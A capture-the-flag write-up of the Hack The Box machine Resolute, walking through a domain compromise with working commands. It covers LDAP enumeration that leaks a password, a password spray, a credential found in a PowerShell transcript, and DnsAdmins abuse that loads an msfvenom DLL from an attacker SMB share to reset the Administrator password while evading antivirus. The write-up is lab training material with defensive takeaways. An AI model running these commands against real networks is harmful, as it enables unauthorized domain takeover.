# HTB Write-Up: Resolute

| Field      | Details                                                              |
|------------|----------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Resolute)         |
| Difficulty | Medium                                                               |
| OS         | Windows                                                              |
| Author     | Samurai                                                              |
| Date       | May 27, 2026                                                         |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — LDAP User & Password Leak](#2-enumeration--ldap-user--password-leak)
3. [Initial Access — Credential Spray & WinRM](#3-initial-access--credential-spray--winrm)
4. [Lateral Movement — PowerShell Transcript Credential Leak](#4-lateral-movement--powershell-transcript-credential-leak)
5. [Privilege Escalation — DnsAdmins to SYSTEM via DLL Injection](#5-privilege-escalation--dnsadmins-to-system-via-dll-injection)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** for service and version fingerprinting:

```bash
nmap -A 10.129.96.155
```

**Open Ports:**

| Port  | Service     | Details                                              |
|-------|-------------|------------------------------------------------------|
| 53    | DNS         | Simple DNS Plus                                      |
| 88    | Kerberos    | Microsoft Windows Kerberos                           |
| 135   | MSRPC       | Microsoft Windows RPC                                |
| 139   | NetBIOS     | Microsoft Windows netbios-ssn                        |
| 389   | LDAP        | Domain: `megabank.local`                             |
| 445   | SMB         | Windows Server 2016 Standard 14393                   |
| 464   | kpasswd5    | tcpwrapped                                           |
| 593   | HTTP-RPC    | RPC over HTTP 1.0                                    |
| 636   | LDAPSSL     | tcpwrapped                                           |
| 3268  | LDAP        | Active Directory Global Catalog                      |
| 5985  | WinRM       | Microsoft HTTPAPI httpd 2.0                          |

The Nmap scan confirmed the domain: **`megabank.local`**, hostname **`RESOLUTE`**, running **Windows Server 2016 Standard**.

---

## 2. Enumeration — LDAP User & Password Leak

### 2.1 — LDAP Anonymous Enumeration

Anonymous LDAP access was tested to enumerate domain users and their descriptions:

```bash
ldapsearch -H ldap://megabank.local -x -b "DC=megabank,DC=local" \
  "(objectClass=user)" sAMAccountName cn description
```

A full list of 27 domain users was returned. Critically, one account had a plaintext password left in the `description` field:

```
# Marko Novak, Employees, MegaBank Users, megabank.local
cn: Marko Novak
description: Account created. Password set to Welcome123!
sAMAccountName: marko
```

Credential recovered from LDAP description:

| Account              | Password      |
|----------------------|---------------|
| `megabank.local\marko` | `Welcome123!` |

### 2.2 — Username Extraction

All `sAMAccountName` values were extracted for use in a password spray:

```bash
ldapsearch -H ldap://megabank.local -x -b "DC=megabank,DC=local" \
  "(objectClass=user)" sAMAccountName | grep "sAMAccountName" | cut -d ':' -f2
```

---

## 3. Initial Access — Credential Spray & WinRM

The password `Welcome123!` from Marko's description was sprayed across all enumerated users. The credential was valid for **`melanie`**, who had WinRM access:

```bash
evil-winrm -i megabank.local -u melanie -p 'Welcome123!'
```

Access was gained as `MEGABANK\melanie`. BloodHound collection was performed to map attack paths:

```bash
bloodhound-python -d megabank.local --zip -c All -ns 10.129.96.155 \
  -u melanie -p 'Welcome123!'
```

**User flag retrieved from** `C:\Users\melanie\Desktop\user.txt`.

---

## 4. Lateral Movement — PowerShell Transcript Credential Leak

### 4.1 — Hidden Directory Discovery

While exploring the filesystem with `-force` to reveal hidden items, a non-standard directory was found:

```powershell
*Evil-WinRM* PS C:\> dir -force
```

```
d--h--  12/3/2019  6:32 AM  PSTranscripts
```

### 4.2 — PowerShell Transcript Analysis

Inside `C:\PSTranscripts\20191203\`, a PowerShell transcript log was found:

```
PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

The transcript recorded a `net use` command run by user `ryan` with credentials embedded in plaintext:

```
cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

Credential recovered from transcript:

| Account             | Password             |
|---------------------|----------------------|
| `megabank.local\ryan` | `Serv3r4Admin4cc123!` |

### 4.3 — Lateral Move to Ryan

```bash
evil-winrm -i megabank.local -u ryan -p 'Serv3r4Admin4cc123!'
```

Ryan's group memberships (confirmed via BloodHound) showed membership in **`DnsAdmins`** — a privileged group that allows loading arbitrary DLLs into the DNS service.

---

## 5. Privilege Escalation — DnsAdmins to SYSTEM via DLL Injection

### 5.1 — DLL Creation

Membership in `DnsAdmins` allows specifying a plugin DLL for the DNS Server service via `dnscmd.exe`. Since copying a malicious DLL to disk would trigger Windows Defender, the DLL was hosted remotely on an SMB share and loaded directly into memory over the network.

A DLL payload was crafted to reset the Administrator password:

```bash
msfvenom -p windows/x64/exec \
  cmd='net user administrator P@s5w0rd123!' \
  -f dll -o temp/da.dll
```

### 5.2 — SMB Hosting

The DLL was served remotely to avoid writing to disk on the target:

```bash
impacket-smbserver -smb2support temp temp -username admin -password admin
```

### 5.3 — DLL Registration via dnscmd

The DNS Server was configured to load the DLL from the remote SMB share:

```powershell
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.15.24\temp\da.dll
```

```
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

### 5.4 — DNS Service Restart

The DNS service was restarted to trigger DLL loading as **SYSTEM**:

```powershell
sc.exe stop dns
sc.exe start dns
```

### 5.5 — Verification

The Administrator password change was confirmed:

```powershell
net user administrator
# Password last set: 5/27/2026 5:46:03 AM ✓
```

### 5.6 — Administrator Access

```bash
impacket-psexec megabank.local/administrator:'P@s5w0rd123!'@10.129.96.155
```

**Root flag retrieved from** `C:\Users\Administrator\Desktop\root.txt`.

---

## 6. Summary

| Phase              | Technique                                  | Result                                         |
|--------------------|--------------------------------------------|------------------------------------------------|
| Recon              | Nmap -A                                    | DC identified, domain `megabank.local`, WS2016 |
| LDAP Enumeration   | Anonymous ldapsearch                       | 27 users enumerated, `marko` description leak  |
| Credential Spray   | `Welcome123!` sprayed across all users     | Valid for `melanie`, WinRM access              |
| BloodHound         | bloodhound-python full collection          | `ryan` identified as `DnsAdmins` member        |
| Lateral Movement   | PSTranscripts hidden directory             | `ryan:Serv3r4Admin4cc123!` found in transcript |
| Privilege Escalation | DnsAdmins + dnscmd DLL injection via SMB | Administrator password reset, SYSTEM shell     |
| Root               | psexec as Administrator                    | Root flag retrieved                            |

### Key Takeaways

- **Never store passwords in LDAP description fields.** Anonymous LDAP queries are possible on many misconfigured DCs and description fields are world-readable by default. Any credential placed there is immediately available to unauthenticated attackers.

- **PowerShell transcripts are a goldmine for attackers.** Transcripts record every command including arguments — meaning any credential passed on the command line (like `net use` with a password) is written to disk in plaintext. Either disable transcription or ensure transcript directories are strictly access-controlled and regularly audited.

- **DnsAdmins is a de facto privilege escalation path to SYSTEM.** The ability to specify a remote DLL loaded by the DNS service — which runs as SYSTEM — means any member of `DnsAdmins` can trivially escalate. This group should be treated with the same sensitivity as `Domain Admins`. Membership should be minimal and monitored.

- **Hosting payloads over SMB bypasses file-based AV scanning.** Loading a DLL directly from a remote share means the malicious file never touches the target's filesystem, evading most endpoint detection that relies on file writes.
